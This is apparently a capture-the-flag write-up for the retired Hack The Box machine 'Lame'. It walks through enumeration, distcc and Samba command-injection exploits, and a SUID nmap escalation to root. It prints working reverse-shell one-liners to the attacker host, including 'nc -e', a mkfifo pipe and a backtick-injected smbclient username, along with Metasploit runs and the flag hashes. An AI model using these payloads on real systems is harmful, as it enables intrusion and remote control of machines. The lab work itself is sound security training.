# Lame

> **Hack The Box | Linux | Easy**
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 8.04 (Hardy Heron) |
| **Kernel** | 2.6.24-16-server |
| **Difficulty** | Easy |
| **Category** | Linux / CVE Exploitation / SUID GTFOBins |
| **IP Address** | 10.129.42.113 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2004-2687 (distcc), CVE-2007-2447 (Samba usermap script: alternate path) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP port scan: 5 services identified |: |
| 2 | FTP anonymous login: vsftpd 2.3.4 (backdoor attempt → no trigger) | `daemon` |
| 3 | SMB enumeration: Samba 3.0.20, /tmp share accessible, no useful content |: |
| 4 | distcc CVE-2004-2687 exploitation via nmap script → Metasploit | `daemon` |
| 5 | SUID nmap 4.53 interactive mode shell escape | `root` (euid=0) |

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --privileged -sS -sV -sC -Pn -p- -T4 -o lame.json 10.129.42.113
```

```
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for 10.129.42.113
Host is up (0.14s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.236
|      Logged in as ftp
|      TYPE: ASCII
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-05-08T23:36:05-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 217.03 seconds
```

**Key findings:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 21 | FTP | vsftpd 2.3.4 | Anonymous login allowed. Known backdoor version |
| 22 | SSH | OpenSSH 4.7p1 | No known RCE. Useful for stable shell later |
| 139/445 | SMB | Samba 3.0.20-Debian | Known RCE: CVE-2007-2447 (usermap_script) |
| 3632 | distccd | distccd v1 / GCC 4.2.4 | Known RCE: CVE-2004-2687 |

Three potentially exploitable services identified. Investigation priority: FTP → SMB → distcc.

---

## Service Investigation

### Port 21: FTP (vsftpd 2.3.4)

vsftpd 2.3.4 is notorious for containing a backdoor introduced by an attacker who compromised the project's distribution archive in July 2011. The backdoor triggers when a username contains `:)`: it opens a bind shell on TCP port 6200.

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.42.113
```

```
Connected to 10.129.42.113.
220 (vsFTPd 2.3.4)
Name (10.129.42.113:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||55743|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> bye
```

Anonymous login succeeds but the FTP root is empty. Test the backdoor trigger:

```bash
# Backdoor attempt: username with smiley face triggers bind shell on port 6200
Hackerpatel007_1@htb[/htb]$ ftp 10.129.42.113
Name: backdoored:)
Password: anything
```

```bash
# If backdoor triggers, port 6200 opens: test immediately
Hackerpatel007_1@htb[/htb]$ nc 10.129.42.113 6200
```

The port 6200 connection attempt times out: the backdoor is not present on this specific binary. This is the **patched** vsftpd 2.3.4 package from Debian/Ubuntu repos, not the compromised source archive. **Dead end: move on.**

---

### Port 445: SMB (Samba 3.0.20-Debian)

Samba 3.0.20 is vulnerable to CVE-2007-2447 (MS-RPC shell metacharacter injection via the username field in the SamrChangePassword call). However, first enumerate available shares.

```bash
Hackerpatel007_1@htb[/htb]$ enum4linux -a 10.129.42.113
```

```
 ========================== 
|    Share Enumeration     |
 ==========================
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

[+] Attempting to map shares on 10.129.42.113
//10.129.42.113/print$  Mapping: DENIED, Listing: N/A
//10.129.42.113/tmp     Mapping: OK, Listing: OK
//10.129.42.113/opt     Mapping: DENIED, Listing: N/A
```

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.42.113/tmp -N
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May  9 00:18:24 2026
  ..                                 DR        0  Sun May 20  2012 12:36:11 2012
  5563.jsvc_up                        R        0  Fri May  8 23:34:01 2026
  .ICE-unix                          DH        0  Fri May  8 23:33:39 2026
  .X11-unix                          DH        0  Fri May  8 23:33:43 2026
  .X0-lock                           HR        0  Fri May  8 23:33:43 2026
  vgauthsvclog.txt.0                  R     1600  Fri May  8 23:33:36 2026

smb: \>
```

The `/tmp` share maps to the actual `/tmp` directory on the host: world-accessible. No useful files are present. Note for later: if we land a shell, we can write files here that will be accessible via SMB.

**Samba 3.0.20 CVE-2007-2447: alternate path (documented):**

```bash
# This version is vulnerable to username metacharacter injection
# Metasploit path: exploit/multi/samba/usermap_script
# Payload: cmd/unix/reverse: no authentication required
# Result: root shell directly (daemon process runs as root on this config)
```

> This path is valid and yields root directly: documented here as the alternate route. The primary path taken was via distcc.

---

### Port 3632: distccd (CVE-2004-2687)

distcc is a distributed compilation daemon. This version accepts arbitrary command execution via a specially crafted compile request: the daemon does not validate that the requested command is actually a compiler.

**Confirm vulnerability with nmap script:**

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 3632 10.129.42.113 \
  --script distcc-cve2004-2687 \
  --script-args="distcc-exec.cmd=id"
```

```
PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|     Disclosure date: 2002-02-01
|     Extra information:
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html
```

Output confirms: `uid=1(daemon) gid=1(daemon)`: remote command execution as the daemon user.

---

## Exploitation: distcc CVE-2004-2687

### Vulnerability Background

distcc's daemon (`distccd`) was designed to accept incoming compile jobs over the network and execute them locally. The vulnerability stems from a complete lack of input validation: `distccd` will execute any command it receives, not just compiler invocations. By crafting a request that instructs distccd to run `sh -c <payload>`, an attacker gains unauthenticated remote code execution as the `daemon` user.

**Affected versions:** distcc 3.1 and earlier when run without the `--allow` whitelist option.

### Step 1: Verify with nmap Script (RCE Proof)

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 3632 10.129.42.113 \
  --script distcc-cve2004-2687 \
  --script-args="distcc-exec.cmd=nc 10.10.16.236 4444"
```

```
PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Step 2: Exploit via Metasploit

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
```

```bash
msf6 > search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution

msf6 > use 0
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 10.129.42.113
RHOSTS => 10.129.42.113
msf6 exploit(unix/misc/distcc_exec) > set LHOST tun0
LHOST => 10.10.16.236
msf6 exploit(unix/misc/distcc_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > run
```

```
[*] Started reverse TCP double handler on 10.10.16.236:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo qobWVS07WIr2bbGh;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "qobWVS07WIr2bbGh\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.236:4444 -> 10.129.42.113:48020) at 2026-05-09 00:49:52 -0400

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Shell received as `daemon`. Upgrade to a more stable shell:

```bash
bash -i
# python3 not available on this Ubuntu 8.04 install
daemon@lame:/tmp$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$
```

### Manual Exploitation (Without Metasploit)

```bash
# Start listener
Hackerpatel007_1@htb[/htb]$ nc -nvlp 4444

# Trigger reverse shell directly via nmap script
Hackerpatel007_1@htb[/htb]$ nmap -p 3632 10.129.42.113 \
  --script distcc-cve2004-2687 \
  --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.16.236 4444'"
```

If `nc -e` is not available (OpenBSD netcat):

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 3632 10.129.42.113 \
  --script distcc-cve2004-2687 \
  --script-args="distcc-exec.cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.236 4444 >/tmp/f'"
```

---

## Post-Exploitation: Initial Foothold

### System Enumeration

```bash
daemon@lame:/$ uname -a
```

```
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

```bash
daemon@lame:/$ cat /etc/lsb-release
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

Ubuntu 8.04 Hardy Heron: end of life. Kernel 2.6.24 is ancient and has multiple public kernel exploits available.

### Home Directory Enumeration

```bash
daemon@lame:/$ ls /home
```

```
ftp  makis  service  user
```

```bash
daemon@lame:/$ find / -name user.txt 2>/dev/null
```

```
/home/makis/user.txt
```

```bash
daemon@lame:/home/makis$ cat user.txt
```

```
cb890ccf8c75aaa129dec4c7cdabd5d2
```

User flag obtained as `daemon`: the flag is in `makis`'s home directory, which is world-readable.

---

## Privilege Escalation: SUID nmap Interactive Mode

### SUID Binary Enumeration

```bash
daemon@lame:/$ find / -perm -4000 -type f 2>/dev/null
```

```
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
```

**Standout finding:** `/usr/bin/nmap` has the SUID bit set.

```bash
daemon@lame:/$ ls -la /usr/bin/nmap
```

```
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```

```bash
daemon@lame:/$ nmap --version
```

```
Nmap version 4.53 ( http://insecure.org )
```

**Critical:** Nmap 4.53 supports `--interactive` mode: a legacy feature that drops the user into an interactive nmap shell from which `!command` executes OS commands. Because nmap has the SUID bit set with owner `root`, commands run via `!` inherit the effective UID of `root`.

### GTFOBins: nmap --interactive

```bash
daemon@lame:/$ nmap --interactive
```

```
Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

```
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
```

`euid=0`: effective UID is root. The process is running as root from the SUID context. Any file system access and command execution uses root privileges.

---

## Flag Collection

### root.txt

```bash
cat /root/root.txt
```

```
4dc72885873e0975831a1650f691ecf7
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/makis/user.txt` | `cb890ccf8c75aaa129dec4c7cdabd5d2` |
| **root.txt** | `/root/root.txt` | `4dc72885873e0975831a1650f691ecf7` |

---

## Alternative Root Path: Samba CVE-2007-2447

Samba 3.0.20 is also vulnerable to CVE-2007-2447 (usermap_script injection). This path is worth knowing as it yields root **directly** without a privilege escalation step.

### Background

The `MS-RPC SamrChangePassword` function in Samba 3.0.20 passes the username to `/bin/sh` for processing when the `username map script` smb.conf option is configured. If the username contains shell metacharacters (e.g., backtick or `$()`), they are executed as root: the Samba process runs as root on this machine.

### Exploitation

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.129.42.113
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.236
msf6 exploit(multi/samba/usermap_script) > set LPORT 5555
msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > run
```

```
[*] Started reverse TCP double handler on 10.10.16.236:5555
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (10.10.16.236:5555 -> 10.129.42.113:50730)

id
uid=0(root) gid=0(root)
```

Direct root via Samba: no privilege escalation needed.

**Manual path (no Metasploit):**

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 5555 &

Hackerpatel007_1@htb[/htb]$ smbclient //10.129.42.113/tmp \
  -U "/=`nohup nc -e /bin/sh 10.10.16.236 5555`"
```

The username metacharacter injection is handled before authentication: the shell executes as root immediately.

---

## Full Attack Chain Reference

```
[Recon] nmap -sS -sV -sC -p- → 5 services: FTP 21, SSH 22, SMB 139/445, distccd 3632
    │
    ├─[FTP] vsftpd 2.3.4 → anonymous login, empty dir, backdoor not triggered → dead end
    │
    ├─[SMB] Samba 3.0.20 → enum4linux → /tmp share accessible, no useful files
    │        └─[Alt Path] CVE-2007-2447 usermap_script → uid=0(root) directly
    │
    └─[distcc] Port 3632 → nmap script confirms CVE-2004-2687
            │
            └─[Exploit] distcc_exec (Metasploit) → uid=1(daemon)
                    │
                    ├─ /home/makis/user.txt → cb890ccf8c75aaa129dec4c7cdabd5d2
                    │
                    └─[PrivEsc] find SUID → /usr/bin/nmap 4.53
                            │
                            └─ nmap --interactive → !sh → euid=0(root)
                                    │
                                    └─ /root/root.txt → 4dc72885873e0975831a1650f691ecf7
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap --privileged -sS -sV -sC -Pn -p- -T4 10.129.42.113` | Full TCP port scan with version + scripts |
| `ftp 10.129.42.113` (user: anonymous) | Anonymous FTP login |
| `enum4linux -a 10.129.42.113` | Full SMB enumeration |
| `smbclient //10.129.42.113/tmp -N` | Access /tmp share unauthenticated |
| `nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd=id"` | Verify distcc RCE with id |
| `use exploit/unix/misc/distcc_exec` | Load distcc Metasploit module |
| `set payload cmd/unix/reverse` | Use reverse TCP shell payload |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to PTY (python2, not python3) |
| `find / -perm -4000 -type f 2>/dev/null` | Enumerate SUID binaries |
| `nmap --interactive` | Enter nmap legacy interactive mode |
| `!sh` | Execute shell from within nmap interactive |
| `cat /home/makis/user.txt` | Read user flag |
| `cat /root/root.txt` | Read root flag from SUID root shell |

---

## Lessons Learned

**1. Always verify the backdoor state: don't assume vsftpd 2.3.4 = backdoored.**
The distro-packaged vsftpd 2.3.4 from Ubuntu/Debian repos was not the compromised version. The backdoor was introduced into the project's upstream download: distro packages were signed and clean. Always verify: test the `:)` username trigger and attempt to connect to port 6200. Don't waste time if port 6200 doesn't respond.

**2. When multiple exploitable services are present, start with the lowest-hanging fruit.**
This machine exposed FTP, SMB, and distcc: all vulnerable. The fastest path to a foothold was distcc (unauthenticated RCE, one Metasploit module). The fastest path to root was the Samba usermap_script (also unauthenticated, direct root). Methodical enumeration before choosing an exploit path saves time on exams.

**3. SUID nmap --interactive is a classic GTFOBins escape.**
Nmap versions below 5.x support `--interactive` mode. When combined with a SUID bit, `!sh` inside the interactive shell spawns `/bin/sh` inheriting nmap's effective UID: root. This exact technique appears on OSCP-style exams. Always check `nmap --version` when you find a SUID nmap binary.

**4. `euid=0` is functionally root for file system access.**
The `id` output showed `uid=1(daemon) gid=1(daemon) euid=0(root)`. The effective UID governs file access checks: `euid=0` means all files including `/root/root.txt` are readable. Understanding the difference between real UID and effective UID is important for interpreting privilege escalation output.

**5. Ubuntu 8.04 + kernel 2.6.24 = multiple kernel exploit paths available.**
`uname -r` returned `2.6.24-16-server`. This kernel is vulnerable to a range of local privilege escalation exploits (dirty cow family, null pointer dereferences, etc.). In a real engagement, kernel version should always be noted for the privilege escalation section of the report even when a simpler path is available.

**6. python3 may not exist on very old systems.**
`bash: python3: command not found` on Ubuntu 8.04 is expected: python3 was not packaged for Hardy Heron. Always fall back to `python` (python2) for PTY spawning on legacy Linux targets.

---

## References

- [CVE-2004-2687: NVD](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [CVE-2007-2447: Samba usermap_script](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [vsftpd 2.3.4 Backdoor: Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [GTFOBins: nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [distcc Security Advisory](https://distcc.github.io/security.html)
- [Metasploit: distcc_exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/)

---

*HTB Retired Machine: Lame | Completed May 2026 | Flags included per HTB retired machine policy.*
